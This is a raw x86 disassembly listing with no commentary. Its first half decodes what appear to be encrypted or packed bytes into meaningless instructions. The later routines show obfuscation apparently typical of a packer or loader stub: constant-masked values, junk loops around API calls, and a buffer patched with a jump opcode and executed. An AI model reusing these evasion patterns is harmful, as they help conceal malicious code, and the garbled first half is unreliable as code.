  409a9b:	cld    
  409a9c:	add    bh,BYTE PTR [edi]
  409a9e:	or     ebx,DWORD PTR [eax+0x34]
  409aa1:	jle    0x409a72
  409aa3:	fsubr  QWORD PTR [eax-0x662c7803]
  409aa9:	sbb    eax,0x99c7f294
  409aae:	idiv   BYTE PTR [edx+0x78]
  409ab1:	push   cs
  409ab2:	into   
  409ab3:	ret    
  409ab4:	daa    
  409ab5:	call   0x521e:0xb240f7c1
  409abc:	les    esp,FWORD PTR [ebp+0x3d]
  409abf:	enter  0x7c93,0xc2
  409ac3:	int    0x8
  409ac5:	ret    0xee91
  409ac8:	gs getsec 
  409acb:	add    al,0xeb
  409acd:	jge    0x409a50
  409acf:	push   ecx
  409ad0:	xchg   ecx,eax
  409ad1:	mov    edx,0x5628c545
  409ad6:	mov    eax,ds:0xf25dec53
  409adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409adc:	pop    es
  409add:	test   bl,bl
  409adf:	jmp    0xf1c6:0xf4ecdc44
  409ae6:	cmp    ebp,DWORD PTR [ebp+0x6b864cf6]
  409aec:	xchg   edx,eax
  409aed:	and    dh,BYTE PTR [ebx]
  409aef:	sub    edx,DWORD PTR [esi]
  409af1:	out    dx,eax
  409af2:	mov    al,ds:0xabd5a0d1
  409af7:	jb     0x409b30
  409af9:	bound  ebx,QWORD PTR [ebx+ebp*2]
  409afc:	dec    esi
  409afd:	(bad)  
  409afe:	cwde   
  409aff:	pop    ebx
  409b00:	xor    DWORD PTR [ebx-0x37fd9424],edi
  409b06:	pop    ds
  409b07:	add    BYTE PTR [eax],bh
  409b09:	js     0x409ae0
  409b0b:	mov    dl,0xe
  409b0d:	int3   
  409b0e:	sbb    ebx,ecx
  409b10:	(bad)  
  409b11:	int    0x86
  409b13:	mov    bl,0xc1
  409b15:	mov    BYTE PTR [ebp+edx*2-0x36],dh
  409b19:	xchg   esp,eax
  409b1a:	inc    eax
  409b1b:	pop    ebp
  409b1c:	mov    ebx,0xf9f03c67
  409b21:	test   eax,0xe59b79f0
  409b26:	js     0x409b13
  409b28:	scas   eax,DWORD PTR es:[edi]
  409b29:	lock scas al,BYTE PTR es:[edi]
  409b2b:	pop    ecx
  409b2c:	cmp    esp,DWORD PTR [esi-0xe]
  409b2f:	jno    0x409b80
  409b31:	cmp    DWORD PTR [ebx-0x7027ea80],ebx
  409b37:	jle    0x409b66
  409b39:	popa   
  409b3a:	push   ebp
  409b3b:	jle    0x409ad7
  409b3d:	int    0x4e
  409b3f:	popf   
  409b40:	je     0x409b4a
  409b42:	stc    
  409b43:	sbb    al,0x3d
  409b45:	pop    ebp
  409b46:	lea    edi,[edi+eax*4+0x4a]
  409b4a:	push   ebx
  409b4b:	or     eax,0x4834d688
  409b50:	ror    DWORD PTR [ecx],1
  409b52:	add    eax,0x2b1d7bd6
  409b57:	sub    BYTE PTR ds:0x50211678,bh
  409b5d:	sub    al,0x86
  409b5f:	shl    DWORD PTR [esi+esi*2],1
  409b62:	fild   WORD PTR [ebp-0x1a036f72]
  409b68:	fisttp DWORD PTR [ebp+0x6dd8d8ee]
  409b6e:	xor    DWORD PTR [ebx],eax
  409b70:	push   0x86bf9bff
  409b75:	mov    bh,0xd4
  409b77:	push   edi
  409b78:	xchg   DWORD PTR [edx+0x47],esp
  409b7b:	cdq    
  409b7c:	jmp    0x409b16
  409b7e:	mov    ss:0x3453d01e,al
  409b84:	and    eax,0x6d5a7127
  409b89:	fwait
  409b8a:	jns    0x409b19
  409b8c:	mov    WORD PTR [edx-0x50],ss
  409b8f:	cmc    
  409b90:	repz or al,0xf3
  409b93:	pusha  
  409b94:	(bad)  
  409b95:	std    
  409b96:	lods   al,BYTE PTR ds:[esi]
  409b97:	cmp    ebx,DWORD PTR [edx+edi*8+0x13]
  409b9b:	dec    edx
  409b9c:	paddw  mm4,QWORD PTR [ebx+0x1d3c2862]
  409ba3:	xchg   BYTE PTR [eax],ah
  409ba5:	jno    0x409bf3
  409ba7:	sbb    dh,bh
  409ba9:	stc    
  409baa:	xchg   ecx,eax
  409bab:	mov    bh,0x1e
  409bad:	test   al,0x4c
  409baf:	idiv   ah
  409bb1:	aas    
  409bb2:	add    BYTE PTR [eax+0x5bccce75],cl
  409bb8:	call   0x80a8:0x6a42ec20
  409bbf:	arpl   WORD PTR ds:0x8cc6f5fa,bx
  409bc5:	cmp    eax,0x860fe9d4
  409bca:	mov    al,ds:0xef591d27
  409bcf:	cmp    DWORD PTR [eax],edi
  409bd1:	mov    ebx,0x40a9ee45
  409bd6:	stos   DWORD PTR es:[edi],eax
  409bd7:	or     eax,0x42a0efdd
  409bdc:	sub    dl,BYTE PTR ds:0x84555c50
  409be2:	clc    
  409be3:	mov    ebp,0x565f26df
  409be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409be9:	xchg   ecx,eax
  409bea:	xor    DWORD PTR [edx-0x11bc8a5d],eax
  409bf0:	ins    BYTE PTR es:[edi],dx
  409bf1:	jo     0x409c3c
  409bf3:	lds    esp,FWORD PTR gs:[ebp+eiz*2-0x7aff9a91]
  409bfb:	pop    ebp
  409bfc:	mov    DWORD PTR [edi+esi*1],esi
  409bff:	iret   
  409c00:	into   
  409c01:	adc    ch,ch
  409c03:	dec    ebx
  409c04:	cmp    cl,bh
  409c06:	in     eax,dx
  409c07:	jo     0x409bc4
  409c09:	dec    ecx
  409c0a:	inc    ebp
  409c0b:	jae    0x409c6c
  409c0d:	and    DWORD PTR [edi],ebx
  409c0f:	test   DWORD PTR [eax],edx
  409c11:	retf   
  409c12:	mov    ds:0xed2d58d6,al
  409c17:	dec    eax
  409c18:	repnz lods al,BYTE PTR ds:[esi]
  409c1a:	xchg   esi,eax
  409c1b:	pop    eax
  409c1c:	(bad)  
  409c1d:	sti    
  409c1e:	mov    al,ds:0xa47cf8ca
  409c23:	cs inc edx
  409c25:	xchg   esp,eax
  409c26:	rol    DWORD PTR [ecx+0x45a34979],cl
  409c2c:	fiadd  DWORD PTR [eax+esi*1-0x51]
  409c30:	push   ebx
  409c31:	test   al,0x96
  409c33:	xor    DWORD PTR [ecx],esp
  409c35:	xchg   DWORD PTR [edi],edi
  409c37:	xor    eax,0x6e9a5633
  409c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3d:	rcr    DWORD PTR [ecx-0x1e],cl
  409c40:	cmp    ah,BYTE PTR [esi-0x7412423c]
  409c46:	xor    ebp,ecx
  409c48:	les    ecx,FWORD PTR [edi+esi*8-0x6a]
  409c4c:	jb     0x409c22
  409c4e:	mov    bh,0xe5
  409c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c51:	ret    0x69d
  409c54:	pop    eax
  409c55:	push   0x46
  409c57:	test   al,0xea
  409c59:	(bad)  
  409c5a:	shr    ah,cl
  409c5c:	pop    esi
  409c5d:	inc    BYTE PTR [eax+0x14]
  409c60:	stc    
  409c61:	or     al,0x1d
  409c63:	adc    al,dl
  409c65:	push   0x33
  409c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c68:	mov    DWORD PTR [ecx],0xd2f50d29
  409c6e:	jl     0x409cde
  409c70:	int3   
  409c71:	call   0xe89bbe44
  409c76:	cwde   
  409c77:	sti    
  409c78:	pop    ebp
  409c79:	imul   ecx,DWORD PTR [esi-0x17c10c41],0x867bd6af
  409c83:	test   eax,0xd3fd00fe
  409c88:	lahf   
  409c89:	and    BYTE PTR [eax+0x4c],ch
  409c8c:	sbb    ah,BYTE PTR [edx+0xb]
  409c8f:	bound  esp,QWORD PTR [ebx+0x2f0eb128]
  409c95:	push   cs
  409c96:	ror    DWORD PTR [edi-0x7645168f],0x6
  409c9d:	int    0x69
  409c9f:	stos   BYTE PTR es:[edi],al
  409ca0:	xor    dl,BYTE PTR [ebp+0x73]
  409ca3:	in     eax,0x71
  409ca5:	aad    0xa3
  409ca7:	xchg   ebp,eax
  409ca8:	call   0xd6606f33
  409cad:	mov    ebp,0x62d02975
  409cb2:	add    BYTE PTR [edi+0x42774756],0x3d
  409cb9:	sti    
  409cba:	fmul   QWORD PTR [esi+0xaf9f88d]
  409cc0:	jge    0x409cb3
  409cc2:	xchg   ebx,eax
  409cc3:	jp     0x409c77
  409cc5:	mov    al,0x8
  409cc7:	xchg   ebp,eax
  409cc8:	lods   eax,DWORD PTR ds:[esi]
  409cc9:	cdq    
  409cca:	dec    esi
  409ccb:	inc    ecx
  409ccc:	mov    ch,0xa9
  409cce:	rcr    ebx,0xbb
  409cd1:	scas   al,BYTE PTR es:[edi]
  409cd2:	xor    esp,DWORD PTR [ebx*8-0xb65b806]
  409cd9:	imul   ebp,DWORD PTR [esi+0x1],0xcbc2c7d4
  409ce0:	rol    ebx,cl
  409ce2:	jecxz  0x409c9c
  409ce4:	ret    
  409ce5:	fidiv  DWORD PTR [edx+eiz*8-0x54b3a7ae]
  409cec:	in     al,dx
  409ced:	call   DWORD PTR [eax-0x3]
  409cf0:	sub    dl,BYTE PTR [ebp+0x324951a6]
  409cf6:	loopne 0x409ce4
  409cf8:	bound  eax,QWORD PTR [ebx]
  409cfa:	inc    edi
  409cfb:	and    esp,DWORD PTR [esi]
  409cfd:	xchg   BYTE PTR [esi],cl
  409cff:	xchg   esi,eax
  409d00:	loope  0x409d2a
  409d02:	push   ebx
  409d03:	pop    ebx
  409d04:	and    al,BYTE PTR [edx]
  409d06:	fwait
  409d07:	mov    esp,0x9f0f9a3b
  409d0c:	mov    al,0x2d
  409d0e:	adc    bl,BYTE PTR [eax+0x27d1297b]
  409d14:	in     al,0x60
  409d16:	xlat   BYTE PTR ds:[ebx]
  409d17:	in     eax,0xa
  409d19:	jge    0x409c9c
  409d1b:	adc    eax,0xe2c647c
  409d20:	pop    esp
  409d21:	enter  0x7690,0xb8
  409d25:	pushf  
  409d26:	mov    ds:0xbc612909,al
  409d2b:	ins    BYTE PTR es:[edi],dx
  409d2c:	pop    es
  409d2d:	(bad)  
  409d30:	imul   ebx,DWORD PTR [ebx+0x2e137191],0x38
  409d37:	xor    dl,ah
  409d39:	ss loope 0x409d45
  409d3c:	jp     0x409cbe
  409d3e:	dec    esp
  409d3f:	je     0x409cdb
  409d41:	out    dx,al
  409d42:	jns    0x409d62
  409d44:	shl    bh,cl
  409d46:	pop    eax
  409d47:	dec    ebx
  409d48:	bound  esi,QWORD PTR [edx+0x7d2f629f]
  409d4e:	(bad)  
  409d4f:	xchg   DWORD PTR [ebp-0x65],ebx
  409d52:	cmp    eax,0xe4939f9c
  409d57:	mov    cs,edi
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	repnz mov DWORD PTR [edi-0x42],eax
  409d5e:	cmp    edi,DWORD PTR [ecx+eiz*2-0x5af1f4a6]
  409d65:	pop    ss
  409d66:	imul   edx,DWORD PTR [ebx-0x1f4a3bc2],0x54a11a17
  409d70:	jno    0x409d36
  409d72:	xchg   bx,ax
  409d74:	xlat   BYTE PTR ds:[ebx]
  409d75:	cwde   
  409d76:	sbb    bh,dl
  409d78:	fild   WORD PTR [edx+esi*4-0x59]
  409d7c:	aas    
  409d7d:	mov    ds,ebx
  409d7f:	enter  0x40dc,0x7b
  409d83:	add    al,0xe1
  409d85:	mov    al,BYTE PTR [ebp-0x36e1f7e8]
  409d8b:	inc    edi
  409d8c:	add    al,0x7e
  409d8e:	cmp    al,0xc9
  409d90:	mov    edx,0x5d92ac13
  409d95:	pop    edx
  409d96:	jo     0x409d43
  409d98:	ret    
  409d99:	xchg   ebp,eax
  409d9a:	adc    DWORD PTR [edx+0x36094184],ebx
  409da0:	int3   
  409da1:	ror    DWORD PTR [edx+esi*4+0x6d39d485],1
  409da8:	jp     0x409d68
  409daa:	test   esp,eax
  409dac:	mov    ds,WORD PTR [ebp+edi*1+0x3d]
  409db0:	or     BYTE PTR [ecx+edi*4],0xb8
  409db4:	shl    BYTE PTR [edi-0x13e7318d],cl
  409dba:	adc    esi,DWORD PTR [edi+0x4fff054d]
  409dc0:	inc    BYTE PTR [eax]
  409dc2:	sub    al,BYTE PTR [edx]
  409dc4:	inc    esi
  409dc5:	mov    edi,0x8194cf86
  409dca:	add    al,0x41
  409dcc:	adc    DWORD PTR [esi],esi
  409dce:	adc    al,0x95
  409dd0:	inc    eax
  409dd1:	inc    edi
  409dd2:	retf   
  409dd3:	and    edx,DWORD PTR [esp+esi*8]
  409dd6:	into   
  409dd7:	aam    0xc3
  409dd9:	sub    esp,DWORD PTR ds:0x233db446
  409ddf:	mov    dh,0x93
  409de1:	xor    BYTE PTR [ecx-0x786f738a],dl
  409de7:	inc    edi
  409de8:	test   al,0x4e
  409dea:	mov    DWORD PTR [edx-0x51c7e47f],ecx
  409df0:	xor    DWORD PTR [eax+eiz*8-0x38],ebx
  409df4:	shl    eax,0xb
  409df7:	nop
  409df8:	or     BYTE PTR [ebx-0x8],dl
  409dfb:	(bad)  
  409dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dfd:	cdq    
  409dfe:	ret    0xc0f9
  409e01:	add    DWORD PTR [edx],ecx
  409e03:	retf   0xfa89
  409e06:	ins    DWORD PTR es:[edi],dx
  409e07:	dec    esp
  409e08:	inc    eax
  409e09:	(bad)  [edx+0x4f]
  409e0c:	outs   dx,DWORD PTR ds:[esi]
  409e0d:	pop    esi
  409e0e:	push   cs
  409e0f:	jecxz  0x409d9f
  409e11:	xor    BYTE PTR [esi-0x26],dh
  409e14:	adc    al,0x5e
  409e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e17:	in     al,0xad
  409e19:	pop    esp
  409e1a:	cmp    ebp,ebp
  409e1c:	mov    ch,0x5a
  409e1e:	nop
  409e1f:	or     esi,esi
  409e21:	pop    es
  409e22:	xor    DWORD PTR [eax-0x4cafa91c],esi
  409e28:	or     DWORD PTR [edi-0xf],0x88edd4e8
  409e2f:	mov    WORD PTR [esi+0x373e7afd],ds
  409e35:	xor    DWORD PTR [ebx+0x774a1fb8],ebp
  409e3b:	mov    ch,0x38
  409e3d:	ret    0xfbeb
  409e40:	add    dh,0x21
  409e43:	shr    BYTE PTR [ebx+0x6a],cl
  409e46:	mov    edi,0x625bda7f
  409e4b:	addr16 loopne 0x409eb8
  409e4e:	add    DWORD PTR [ecx],0x7c4f5534
  409e54:	and    eax,0xd20e658f
  409e59:	or     ah,cl
  409e5b:	jns    0x409e89
  409e5d:	or     ecx,DWORD PTR ds:0x78494378
  409e63:	push   ds
  409e64:	ficomp DWORD PTR [ebp+0x77]
  409e67:	mov    eax,DWORD PTR [ebp+0x54]
  409e6a:	js     0x409edb
  409e6c:	cmp    BYTE PTR [esi],ah
  409e6e:	lds    eax,FWORD PTR [eax-0x74fd50f1]
  409e74:	push   ebp
  409e75:	cld    
  409e76:	xor    edx,ecx
  409e78:	mov    ecx,DWORD PTR [ebp+0x8]
  409e7b:	lea    ecx,[edx+ecx*1+0x3272dd]
  409e82:	cmp    ecx,eax
  409e84:	je     0x409efb
  409e8a:	mov    edi,DWORD PTR [ebp-0x14]
  409e8d:	mov    eax,DWORD PTR [ebp+0x8]
  409e90:	mov    edx,DWORD PTR [ebp+0x14]
  409e93:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409e97:	mov    ecx,0x7510896
  409e9c:	xor    edx,edx
  409e9e:	xor    edi,ecx
  409ea0:	mov    esi,0x3272dd
  409ea5:	add    edi,esi
  409ea7:	div    edi
  409ea9:	mov    edx,DWORD PTR [ebp-0x4]
  409eac:	xor    edx,ecx
  409eae:	lea    eax,[edx+eax*1+0x3272dd]
  409eb5:	mov    edx,DWORD PTR [ebp+0x8]
  409eb8:	mov    edi,DWORD PTR [ebp-0x20]
  409ebb:	mov    DWORD PTR [edi+edx*4],eax
  409ebe:	mov    eax,DWORD PTR [ebp-0x14]
  409ec1:	mov    edx,DWORD PTR [ebp+0x8]
  409ec4:	xor    eax,ecx
  409ec6:	lea    eax,[eax+edx*1+0x3272dd]
  409ecd:	mov    DWORD PTR [ebp+0x8],eax
  409ed0:	mov    eax,DWORD PTR [ebp-0x14]
  409ed3:	mov    edx,DWORD PTR [ebp+0x14]
  409ed6:	xor    eax,ecx
  409ed8:	add    eax,esi
  409eda:	imul   eax,DWORD PTR [edx]
  409edd:	mov    edx,DWORD PTR [ebp-0x4]
  409ee0:	xor    edx,ecx
  409ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  409ee5:	lea    ecx,[edx+ecx*1+0x3272dd]
  409eec:	cmp    ecx,eax
  409eee:	jne    0x409e8a
  409ef4:	mov    eax,esi
  409ef6:	jmp    0x409f00
  409efb:	mov    eax,0x3272dd
  409f00:	mov    ebx,0x7510896
  409f05:	mov    ecx,DWORD PTR [ebp-0x4]
  409f08:	xor    ecx,ebx
  409f0a:	add    ecx,eax
  409f0c:	mov    DWORD PTR [ebp-0xc],ecx
  409f0f:	mov    ebx,0x65655
  409f14:	add    ebx,0x3234
  409f1a:	xchg   ebx,esi
  409f1c:	xor    ebx,ebx
  409f1e:	push   esi
  409f1f:	mov    esi,ebx
  409f21:	pop    ebx
  409f22:	mov    edx,esi
  409f24:	add    ebx,0x1002
  409f2a:	lea    eax,[ebp-0x10]
  409f2d:	add    edx,eax
  409f2f:	add    edx,0x5
  409f32:	push   edx
  409f33:	inc    esi
  409f34:	pop    ecx
  409f35:	dec    ecx
  409f36:	xchg   ecx,eax
  409f37:	dec    eax
  409f38:	xchg   ecx,eax
  409f39:	dec    ecx
  409f3a:	xchg   ecx,edx
  409f3c:	dec    edx
  409f3d:	push   edx
  409f3e:	mov    edx,ebx
  409f40:	pop    ebx
  409f41:	dec    ebx
  409f42:	call   DWORD PTR [ebx]
  409f44:	cmp    DWORD PTR [ebp+0x10],esi
  409f47:	je     0x409f66
  409f4d:	xchg   edx,eax
  409f4e:	push   0xb
  409f50:	pop    ecx
  409f51:	push   0x4
  409f53:	pop    ebx
  409f54:	inc    ebx
  409f55:	xchg   ebx,ecx
  409f57:	sub    ebx,ecx
  409f59:	xchg   ebx,ecx
  409f5b:	dec    ecx
  409f5c:	dec    ecx
  409f5d:	mov    eax,DWORD PTR [ebp-0x1c]
  409f60:	imul   eax,ecx
  409f63:	add    esp,eax
  409f65:	xchg   edx,eax
  409f66:	push   eax
  409f67:	xor    ebx,ebx
  409f69:	mov    edx,esp
  409f6b:	dec    edx
  409f6c:	inc    ebx
  409f6d:	add    ebx,DWORD PTR [edx+ebx*1]
  409f70:	dec    ebx
  409f71:	xor    edx,edx
  409f73:	add    DWORD PTR [ebp-0xc],ebx
  409f76:	pop    ebx
  409f77:	mov    eax,DWORD PTR [ebp-0xc]
  409f7a:	pop    edi
  409f7b:	pop    esi
  409f7c:	pop    ebx
  409f7d:	leave  
  409f7e:	ret    0x10
  409f81:	push   ebp
  409f82:	mov    ebp,esp
  409f84:	sub    esp,0x7c
  409f87:	xor    ecx,ecx
  409f89:	xor    ecx,DWORD PTR ds:0x42c014
  409f8f:	xor    DWORD PTR ds:0x42d018,ecx
  409f95:	push   esi
  409f96:	push   edi
  409f97:	movzx  edi,WORD PTR ds:0x429014
  409f9e:	adc    edi,DWORD PTR ds:0x42c018
  409fa4:	mov    DWORD PTR ds:0x429014,edi
  409faa:	mov    eax,ds:0x42e435
  409faf:	or     ecx,0x9a5
  409fb5:	mov    DWORD PTR [ebp-0x24],eax
  409fb8:	mov    eax,ds:0x42e541
  409fbd:	mov    DWORD PTR [ebp-0x34],eax
  409fc0:	or     edi,eax
  409fc2:	and    DWORD PTR [ebp-0x30],0x0
  409fc6:	xor    DWORD PTR ds:0x429018,0x17b1
  409fd0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  409fd7:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  409fde:	mov    eax,DWORD PTR [ebp-0x10]
  409fe1:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe4:	sub    eax,ecx
  409fe6:	mov    DWORD PTR [ebp-0x10],eax
  409fe9:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  409ff0:	and    DWORD PTR ds:0x42901c,0x0
  409ffa:	xor    eax,eax
  409ffc:	or     eax,DWORD PTR ds:0x42901c
  40a002:	inc    eax
  40a003:	mov    ds:0x42901c,eax
  40a008:	cmp    DWORD PTR ds:0x42901c,0xb
  40a00f:	jne    0x40a029
  40a015:	push   0x42e14e
  40a01a:	push   DWORD PTR [ebp-0xc]
  40a01d:	push   DWORD PTR [ebp-0x18]
  40a020:	push   DWORD PTR [ebp-0x24]
  40a023:	call   DWORD PTR ds:0x42ed61
  40a029:	cmp    DWORD PTR ds:0x42901c,0xa
  40a030:	jne    0x40a041
  40a036:	mov    eax,ds:0x42901c
  40a03b:	inc    eax
  40a03c:	mov    ds:0x42901c,eax
  40a041:	cmp    DWORD PTR ds:0x42901c,0x13
  40a048:	jb     0x409ffa
  40a04e:	sub    eax,esi
  40a050:	mov    eax,DWORD PTR [ebp-0x18]
  40a053:	mov    ecx,DWORD PTR [ebp-0x18]
  40a056:	sub    eax,ecx
  40a058:	mov    DWORD PTR [ebp-0x18],eax
  40a05b:	and    DWORD PTR ds:0x429000,0x0
  40a065:	mov    edi,DWORD PTR ds:0x429000
  40a06b:	inc    edi
  40a06c:	mov    DWORD PTR ds:0x429000,edi
  40a072:	cmp    DWORD PTR ds:0x429000,0xe
  40a079:	jne    0x40a08f
  40a07f:	push   0x429000
  40a084:	push   0x4a29
  40a089:	call   DWORD PTR ds:0x42ed65
  40a08f:	cmp    DWORD PTR ds:0x429000,0xd
  40a096:	jne    0x40a0ab
  40a09c:	xor    edi,edi
  40a09e:	or     edi,DWORD PTR ds:0x429000
  40a0a4:	inc    edi
  40a0a5:	mov    DWORD PTR ds:0x429000,edi
  40a0ab:	cmp    DWORD PTR ds:0x429000,0x1e
  40a0b2:	jb     0x40a065
  40a0b8:	and    eax,0x2f3f
  40a0bd:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  40a0c4:	mov    eax,DWORD PTR [ebp-0xc]
  40a0c7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a0ca:	or     edi,esi
  40a0cc:	sub    eax,ecx
  40a0ce:	xor    edi,edi
  40a0d0:	xor    edi,DWORD PTR ds:0x42d004
  40a0d6:	and    DWORD PTR ds:0x429008,edi
  40a0dc:	mov    DWORD PTR [ebp-0xc],eax
  40a0df:	sbb    DWORD PTR ds:0x42a018,0x66a3
  40a0e9:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40a0f0:	adc    DWORD PTR ds:0x42b010,ecx
  40a0f6:	mov    eax,DWORD PTR [ebp-0x1c]
  40a0f9:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a0fc:	xor    esi,esi
  40a0fe:	xor    esi,DWORD PTR ds:0x411fec
  40a104:	mov    edi,DWORD PTR ds:0x411ff8
  40a10a:	sub    edi,esi
  40a10c:	and    esi,DWORD PTR [esi+edi*1]
  40a10f:	sub    eax,ecx
  40a111:	and    DWORD PTR ds:0x42c008,0x0
  40a11b:	mov    ecx,DWORD PTR ds:0x42c008
  40a121:	inc    ecx
  40a122:	mov    DWORD PTR ds:0x42c008,ecx
  40a128:	cmp    DWORD PTR ds:0x42c008,0x16
  40a12f:	jne    0x40a159
  40a135:	push   0x2fca
  40a13a:	push   0x42c014
  40a13f:	push   0x8b86
  40a144:	push   0x42e0af
  40a149:	push   0x5b55
  40a14e:	push   0x1406
  40a153:	call   DWORD PTR ds:0x42ed6d
  40a159:	cmp    DWORD PTR ds:0x42c008,0x10
  40a160:	jb     0x40a11b
  40a166:	add    DWORD PTR ds:0x42a018,ecx
  40a16c:	mov    DWORD PTR [ebp-0x1c],eax
  40a16f:	adc    DWORD PTR ds:0x42d018,ebx
  40a175:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40a17c:	mov    eax,DWORD PTR [ebp-0x20]
  40a17f:	mov    ecx,DWORD PTR [ebp-0x20]
  40a182:	mov    DWORD PTR ds:0x42c014,0x17
  40a18c:	cmp    DWORD PTR ds:0x42c014,0x0
  40a193:	je     0x40a1be
  40a199:	cmp    DWORD PTR ds:0x42c014,0x22
  40a1a0:	jne    0x40a1ac
  40a1a6:	call   DWORD PTR ds:0x42ed71
  40a1ac:	mov    esi,DWORD PTR ds:0x42c014
  40a1b2:	dec    esi
  40a1b3:	mov    DWORD PTR ds:0x42c014,esi
  40a1b9:	jmp    0x40a18c
  40a1be:	sub    eax,ecx
  40a1c0:	and    DWORD PTR ds:0x42a004,0x0
  40a1ca:	jmp    0x40a1dc
  40a1cf:	mov    edi,DWORD PTR ds:0x42a004
  40a1d5:	inc    edi
  40a1d6:	mov    DWORD PTR ds:0x42a004,edi
  40a1dc:	cmp    DWORD PTR ds:0x42a004,0x15
  40a1e3:	jae    0x40a220
  40a1e9:	cmp    DWORD PTR ds:0x42a004,0x6
  40a1f0:	jne    0x40a201
  40a1f6:	push   0x42c008
  40a1fb:	call   DWORD PTR ds:0x42ed75
  40a201:	cmp    DWORD PTR ds:0x42a004,0x5
  40a208:	jne    0x40a21b
  40a20e:	mov    edi,DWORD PTR ds:0x42a004
  40a214:	inc    edi
  40a215:	mov    DWORD PTR ds:0x42a004,edi
  40a21b:	jmp    0x40a1cf
  40a220:	mov    DWORD PTR [ebp-0x20],eax
  40a223:	mov    eax,DWORD PTR [ebp-0x2c]
  40a226:	mov    ecx,DWORD PTR [ebp-0x20]
  40a229:	mov    esi,0x7510896
  40a22e:	xor    eax,esi
  40a230:	mov    edi,0x3272dd
  40a235:	add    eax,edi
  40a237:	or     eax,ecx
  40a239:	mov    DWORD PTR [ebp-0x20],eax
  40a23c:	mov    eax,DWORD PTR [ebp-0x4]
  40a23f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a242:	sub    eax,ecx
  40a244:	mov    DWORD PTR [ebp-0x4],eax
  40a247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  40a24e:	mov    eax,DWORD PTR [ebp-0xc]
  40a251:	xor    eax,esi
  40a253:	add    eax,edi
  40a255:	push   eax
  40a256:	mov    eax,DWORD PTR [ebp-0x10]
  40a259:	xor    eax,esi
  40a25b:	add    eax,edi
  40a25d:	push   eax
  40a25e:	mov    eax,DWORD PTR [ebp-0x4]
  40a261:	xor    eax,esi
  40a263:	add    eax,edi
  40a265:	push   eax
  40a266:	lea    eax,[ebp-0x7c]
  40a269:	push   eax
  40a26a:	push   DWORD PTR [ebp-0x2c]
  40a26d:	push   DWORD PTR [ebp-0x28]
  40a270:	call   0x40f163
  40a275:	test   eax,eax
  40a277:	je     0x40a2a5
  40a27d:	lea    eax,[ebp-0x7c]
  40a280:	push   eax
  40a281:	mov    eax,DWORD PTR [ebp-0x28]
  40a284:	xor    eax,esi
  40a286:	add    eax,edi
  40a288:	push   eax
  40a289:	mov    eax,DWORD PTR [ebp-0x24]
  40a28c:	add    eax,0xaa
  40a291:	push   eax
  40a292:	mov    eax,DWORD PTR [ebp-0x24]
  40a295:	mov    eax,DWORD PTR [eax+0x198]
  40a29b:	push   DWORD PTR [eax]
  40a29d:	call   0x40508b
  40a2a2:	mov    DWORD PTR [ebp-0x14],eax
  40a2a5:	lea    eax,[ebp+0x4]
  40a2a8:	mov    DWORD PTR [ebp-0x30],eax
  40a2ab:	mov    eax,DWORD PTR [ebp-0x14]
  40a2ae:	test   eax,eax
  40a2b0:	je     0x40a318
  40a2b6:	lea    eax,[ebp-0x8]
  40a2b9:	mov    DWORD PTR [ebp-0x38],eax
  40a2bc:	mov    eax,DWORD PTR [ebp-0x34]
  40a2bf:	mov    DWORD PTR [ebp-0x8],eax
  40a2c2:	mov    eax,DWORD PTR [ebp-0x8]
  40a2c5:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2c8:	sub    eax,ecx
  40a2ca:	mov    DWORD PTR [ebp-0x8],eax
  40a2cd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2d0:	xor    ecx,esi
  40a2d2:	mov    eax,0xffcd8d23
  40a2d7:	sub    eax,ecx
  40a2d9:	add    DWORD PTR [ebp-0x8],eax
  40a2dc:	mov    eax,DWORD PTR [ebp-0x8]
  40a2df:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2e2:	mov    DWORD PTR [ecx+0x1],eax
  40a2e5:	mov    eax,DWORD PTR [ebp-0x14]
  40a2e8:	push   DWORD PTR [ebp-0x24]
  40a2eb:	mov    BYTE PTR [eax],0xe9
  40a2ee:	mov    eax,ds:0x42e2b1
  40a2f3:	push   DWORD PTR [eax]
  40a2f5:	push   DWORD PTR ds:0x42e50d
  40a2fb:	push   DWORD PTR ds:0x42e2b9
  40a301:	push   DWORD PTR ds:0x42e4ed
  40a307:	push   DWORD PTR ds:0x42eafd
  40a30d:	push   DWORD PTR [ebp-0x28]
  40a310:	push   DWORD PTR [ebp-0x2c]
  40a313:	mov    eax,DWORD PTR [ebp-0x14]
  40a316:	call   eax
  40a318:	mov    eax,DWORD PTR [ebp-0x30]
  40a31b:	mov    ecx,DWORD PTR ds:0x42e4b1
  40a321:	add    DWORD PTR [eax],ecx
  40a323:	pop    edi
  40a324:	pop    esi
  40a325:	leave  
  40a326:	ret    
  40a327:	push   ebp
  40a328:	mov    ebp,esp
  40a32a:	sub    esp,0x18
  40a32d:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  40a334:	lea    eax,[ebp+0x14]
  40a337:	mov    DWORD PTR [ebp-0x4],eax
  40a33a:	add    edx,0x781f
  40a340:	push   esi
  40a341:	and    esi,esi
  40a343:	mov    esi,0xf89c85b5
  40a348:	mov    DWORD PTR [ebp-0xc],esi
  40a34b:	lea    eax,[ebp-0xc]
  40a34e:	mov    DWORD PTR [ebp-0x14],eax
  40a351:	mov    eax,DWORD PTR [ebp-0xc]
